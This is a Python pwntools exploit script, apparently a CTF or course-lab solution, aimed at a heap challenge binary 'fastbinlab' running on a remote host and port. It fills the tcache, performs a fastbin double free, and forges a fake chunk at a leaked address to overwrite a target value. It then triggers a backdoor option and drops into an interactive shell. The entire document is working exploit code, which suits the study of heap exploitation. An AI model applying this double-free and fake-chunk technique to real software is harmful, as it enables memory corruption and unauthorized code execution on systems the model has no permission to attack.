from pwn import *

# p = process('./fastbinlab')
p = remote('140.112.31.97', 30105)

def create(size, content):
    p.sendlineafter('>', '1')
    p.sendlineafter('size : ', str(size))
    p.sendlineafter('Content : ', content)

def delete(id):
    p.sendlineafter('>', '2')
    p.sendlineafter('index : ', str(id))

def backdoor():
    p.sendlineafter('>', '3')

p.recvuntil('0x')
target = int(p.recvline().strip(), 16)-0x18
success('target = 0x%x', target)

# fill tcache
for i in range(7):
    create(0x18, 'a')
    delete(i)

create(0x18, 'a')
create(0x18, 'a')

# double free
delete(7)
delete(8)
delete(7)

# make fake chunk
create(0x18, p64(target+7)) # choose target+7 to make fake chunk's size on header is 0x23 which is fastbin size
create(0x18, 'a')
create(0x18, 'a')
create(0x18, b'\x00'+p64(0xcafedeadbeefcafe))
backdoor()
p.interactive()
